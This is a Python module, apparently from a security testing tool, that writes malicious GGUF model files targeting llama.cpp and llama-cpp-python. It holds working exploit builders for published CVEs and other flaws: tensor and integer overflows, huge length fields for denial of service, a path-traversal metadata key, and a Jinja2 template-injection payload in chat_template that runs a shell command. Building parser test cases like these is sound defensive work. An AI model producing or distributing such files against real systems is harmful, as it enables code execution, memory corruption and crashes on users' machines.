"""GGUF malicious test case generator.

Generates GGUF files containing exploit payloads that target
vulnerabilities in llama.cpp, llama-cpp-python, and other GGUF parsers.
"""

import os
import struct
from typing import List, Optional

from .base_generator import BaseTestCaseGenerator, GeneratedTestCase


class GGUFTestCaseGenerator(BaseTestCaseGenerator):
    """Generates malicious GGUF test case files.
    
    Creates GGUF files with exploit payloads targeting:
    - CVE-2024-21802: Tensor dimension overflow (llama.cpp)
    - CVE-2024-21836: n_tensors integer overflow (llama.cpp)
    - CVE-2024-34359: Jinja2 SSTI in chat_template (llama-cpp-python)
    - Signed/unsigned conversion exploits
    - DoS via metadata exhaustion
    - Path traversal in metadata
    - Version corruption attacks
    """
    
    # GGUF constants
    GGUF_MAGIC = b"GGUF"
    GGUF_VERSION = 3
    
    # GGUF value types
    GGUF_TYPE_UINT8 = 0
    GGUF_TYPE_INT8 = 1
    GGUF_TYPE_UINT16 = 2
    GGUF_TYPE_INT16 = 3
    GGUF_TYPE_UINT32 = 4
    GGUF_TYPE_INT32 = 5
    GGUF_TYPE_FLOAT32 = 6
    GGUF_TYPE_BOOL = 7
    GGUF_TYPE_STRING = 8
    GGUF_TYPE_ARRAY = 9
    GGUF_TYPE_UINT64 = 10
    GGUF_TYPE_INT64 = 11
    GGUF_TYPE_FLOAT64 = 12
    
    # GGML tensor types
    GGML_TYPE_F32 = 0
    GGML_TYPE_F16 = 1
    GGML_TYPE_Q4_0 = 2
    
    # Vulnerability types
    VULN_TYPES = [
        "dimension_overflow",
        "tensor_count_overflow",
        "jinja2_ssti",
        "signed_unsigned_exploit",
        "dos_metadata_exhaustion",
        "dos_tensor_exhaustion",
        "path_traversal",
        "version_corruption",
        "string_length_overflow",
        "array_length_overflow",
    ]
    
    def get_format_name(self) -> str:
        return "gguf"
    
    def get_format_extensions(self) -> List[str]:
        return [".gguf", ".ggml"]
    
    def get_vulnerability_types(self) -> List[str]:
        return self.VULN_TYPES.copy()
    
    def generate_all(self, output_dir: str) -> List[GeneratedTestCase]:
        """Generate all GGUF exploit test cases."""
        self._ensure_output_dir(output_dir)
        results = []
        
        for vuln_type in self.VULN_TYPES:
            try:
                tc = self.generate_specific(vuln_type, output_dir)
                if tc:
                    results.append(tc)
            except Exception as e:
                print(f"  [!] Failed to generate {vuln_type}: {e}")
        
        return results
    
    def generate_specific(self, vuln_type: str, output_dir: str) -> Optional[GeneratedTestCase]:
        """Generate a specific GGUF vulnerability test case."""
        self._ensure_output_dir(output_dir)
        
        generators = {
            "dimension_overflow": self._gen_dimension_overflow,
            "tensor_count_overflow": self._gen_tensor_count_overflow,
            "jinja2_ssti": self._gen_jinja2_ssti,
            "signed_unsigned_exploit": self._gen_signed_unsigned,
            "dos_metadata_exhaustion": self._gen_dos_metadata,
            "dos_tensor_exhaustion": self._gen_dos_tensor,
            "path_traversal": self._gen_path_traversal,
            "version_corruption": self._gen_version_corruption,
            "string_length_overflow": self._gen_string_length,
            "array_length_overflow": self._gen_array_length,
        }
        
        if vuln_type not in generators:
            return None
        
        return generators[vuln_type](output_dir)
    
    # ========== Helper methods ==========
    
    def _write_string(self, data: bytes) -> bytes:
        """Write a GGUF string (length + data)."""
        return struct.pack("<Q", len(data)) + data
    
    def _write_kv_string(self, key: bytes, value: bytes) -> bytes:
        """Write a string key-value pair."""
        return self._write_string(key) + struct.pack("<I", self.GGUF_TYPE_STRING) + self._write_string(value)
    
    def _write_kv_uint32(self, key: bytes, value: int) -> bytes:
        """Write a uint32 key-value pair."""
        return self._write_string(key) + struct.pack("<I", self.GGUF_TYPE_UINT32) + struct.pack("<I", value)
    
    def _write_kv_uint64(self, key: bytes, value: int) -> bytes:
        """Write a uint64 key-value pair."""
        return self._write_string(key) + struct.pack("<I", self.GGUF_TYPE_UINT64) + struct.pack("<Q", value)
    
    def _create_minimal_header(self, n_tensors: int = 0, n_kv: int = 0, version: int = 3) -> bytes:
        """Create a minimal GGUF header."""
        return (
            self.GGUF_MAGIC +
            struct.pack("<I", version) +
            struct.pack("<Q", n_tensors) +
            struct.pack("<Q", n_kv)
        )
    
    # ========== Vulnerability generators ==========
    
    def _gen_dimension_overflow(self, output_dir: str) -> GeneratedTestCase:
        """Generate CVE-2024-21802: tensor dimension overflow."""
        filename = "exploit_dimension_overflow_CVE-2024-21802.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Create header with 1 tensor, 1 metadata
        data = self._create_minimal_header(n_tensors=1, n_kv=1)
        
        # Add minimal metadata
        data += self._write_kv_string(b"general.name", b"exploit")
        
        # Tensor info with n_dims = 255 (GGML_MAX_DIMS = 4)
        tensor_name = b"overflow_tensor"
        data += self._write_string(tensor_name)
        data += struct.pack("<I", 255)  # n_dims = 255 (exploit!)
        
        # Write 255 dimensions (each 8 bytes)
        for i in range(255):
            data += struct.pack("<Q", 0x4141414141414141)  # AAAA pattern
        
        # Tensor type and offset
        data += struct.pack("<I", self.GGML_TYPE_F32)
        data += struct.pack("<Q", 0)  # offset
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Tensor Dimension Overflow",
            target_parser="llama.cpp",
            cve_id="CVE-2024-21802",
            description="n_dims=255 causes buffer overflow when writing to ggml_tensor.ne[4] array",
            severity="critical",
        )
    
    def _gen_tensor_count_overflow(self, output_dir: str) -> GeneratedTestCase:
        """Generate CVE-2024-21836: n_tensors integer overflow."""
        filename = "exploit_tensor_count_overflow_CVE-2024-21836.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Header with n_tensors that causes integer overflow: 0x1D1D1D1D1D1D1D1D * 88 overflows
        data = (
            self.GGUF_MAGIC +
            struct.pack("<I", self.GGUF_VERSION) +
            struct.pack("<Q", 0x1D1D1D1D1D1D1D1D) +  # n_tensors - overflow value
            struct.pack("<Q", 1)  # n_kv
        )
        
        # Minimal metadata
        data += self._write_kv_string(b"general.name", b"exploit")
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Tensor Count Integer Overflow",
            target_parser="llama.cpp",
            cve_id="CVE-2024-21836",
            description="n_tensors * 88 causes integer overflow in allocation size calculation",
            severity="critical",
        )
    
    def _gen_jinja2_ssti(self, output_dir: str) -> GeneratedTestCase:
        """Generate CVE-2024-34359: Jinja2 SSTI in chat_template."""
        filename = "exploit_jinja2_ssti_CVE-2024-34359.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # SSTI payload that executes code
        ssti_payload = (
            b"{% for x in ().__class__.__base__.__subclasses__() %}"
            b"{% if 'warning' in x.__name__ %}"
            b"{{ x()._module.__builtins__['__import__']('os').system('id') }}"
            b"{% endif %}{% endfor %}"
        )
        
        # Create header
        data = self._create_minimal_header(n_tensors=0, n_kv=2)
        
        # Add metadata
        data += self._write_kv_string(b"general.name", b"exploit")
        data += self._write_kv_string(b"tokenizer.chat_template", ssti_payload)
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Jinja2 Server-Side Template Injection",
            target_parser="llama-cpp-python < 0.2.72",
            cve_id="CVE-2024-34359",
            description="SSTI payload in chat_template executes arbitrary Python code",
            severity="critical",
        )
    
    def _gen_signed_unsigned(self, output_dir: str) -> GeneratedTestCase:
        """Generate signed/unsigned conversion exploit."""
        filename = "exploit_signed_unsigned_conversion.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Create header
        data = self._create_minimal_header(n_tensors=0, n_kv=1)
        
        # Metadata key with length = INT32_MAX + 1 (becomes negative when cast to int32)
        key_length = 2147483649  # 0x80000001
        data += struct.pack("<Q", key_length)  # Key length - overflow value
        data += b"A" * 100  # Partial key data
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Signed/Unsigned Integer Conversion",
            target_parser="llama.cpp",
            cve_id=None,
            description="Length value 0x80000001 becomes negative when cast to int32, bypassing bounds checks",
            severity="critical",
        )
    
    def _gen_dos_metadata(self, output_dir: str) -> GeneratedTestCase:
        """Generate DoS via metadata count exhaustion."""
        filename = "exploit_dos_metadata_exhaustion.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Header with extremely high n_kv
        data = (
            self.GGUF_MAGIC +
            struct.pack("<I", self.GGUF_VERSION) +
            struct.pack("<Q", 0) +  # n_tensors
            struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)  # n_kv = max uint64
        )
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="DoS via Metadata Count Exhaustion",
            target_parser="llama.cpp",
            cve_id=None,
            description="n_kv = UINT64_MAX causes excessive memory allocation or infinite loop",
            severity="high",
        )
    
    def _gen_dos_tensor(self, output_dir: str) -> GeneratedTestCase:
        """Generate DoS via tensor count exhaustion."""
        filename = "exploit_dos_tensor_exhaustion.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Header with extremely high n_tensors (but not overflow pattern)
        data = (
            self.GGUF_MAGIC +
            struct.pack("<I", self.GGUF_VERSION) +
            struct.pack("<Q", 0xFFFFFFFFFFFFFFFF) +  # n_tensors = max uint64
            struct.pack("<Q", 0)  # n_kv
        )
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="DoS via Tensor Count Exhaustion",
            target_parser="llama.cpp",
            cve_id=None,
            description="n_tensors = UINT64_MAX causes memory exhaustion during allocation",
            severity="high",
        )
    
    def _gen_path_traversal(self, output_dir: str) -> GeneratedTestCase:
        """Generate path traversal in metadata."""
        filename = "exploit_path_traversal.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Create header
        data = self._create_minimal_header(n_tensors=0, n_kv=2)
        
        # Path traversal in key name
        data += self._write_kv_string(b"../../../../etc/passwd", b"root:x:0:0::/root:/bin/bash")
        data += self._write_kv_string(b"general.name", b"exploit")
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Path Traversal in Metadata",
            target_parser="GGUF extraction tools",
            cve_id=None,
            description="Metadata key contains path traversal pattern for file overwrite",
            severity="high",
        )
    
    def _gen_version_corruption(self, output_dir: str) -> GeneratedTestCase:
        """Generate version corruption attack."""
        filename = "exploit_version_corruption.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Header with corrupt version (DEADBEEF)
        data = (
            self.GGUF_MAGIC +
            struct.pack("<I", 0xDEADBEEF) +  # Invalid version
            struct.pack("<Q", 0) +  # n_tensors
            struct.pack("<Q", 0)   # n_kv
        )
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Version Corruption",
            target_parser="llama.cpp",
            cve_id=None,
            description="Invalid version 0xDEADBEEF causes parser confusion or crash",
            severity="medium",
        )
    
    def _gen_string_length(self, output_dir: str) -> GeneratedTestCase:
        """Generate string length overflow."""
        filename = "exploit_string_length_overflow.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Create header
        data = self._create_minimal_header(n_tensors=0, n_kv=1)
        
        # Key with normal length, but value with huge length
        data += self._write_string(b"general.name")
        data += struct.pack("<I", self.GGUF_TYPE_STRING)
        data += struct.pack("<Q", 0x7FFFFFFFFFFFFFFF)  # String length = INT64_MAX
        data += b"overflow"  # Partial data
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="String Length Overflow",
            target_parser="llama.cpp",
            cve_id=None,
            description="String length = INT64_MAX causes buffer overflow or out-of-memory",
            severity="critical",
        )
    
    def _gen_array_length(self, output_dir: str) -> GeneratedTestCase:
        """Generate array length overflow."""
        filename = "exploit_array_length_overflow.gguf"
        filepath = os.path.join(output_dir, filename)
        
        # Create header
        data = self._create_minimal_header(n_tensors=0, n_kv=1)
        
        # Array with huge element count
        data += self._write_string(b"tokenizer.ggml.tokens")
        data += struct.pack("<I", self.GGUF_TYPE_ARRAY)
        data += struct.pack("<I", self.GGUF_TYPE_STRING)  # Array of strings
        data += struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)  # Array length = max
        
        with open(filepath, "wb") as f:
            f.write(data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Array Length Overflow",
            target_parser="llama.cpp",
            cve_id=None,
            description="Array length = UINT64_MAX causes memory exhaustion",
            severity="high",
        )
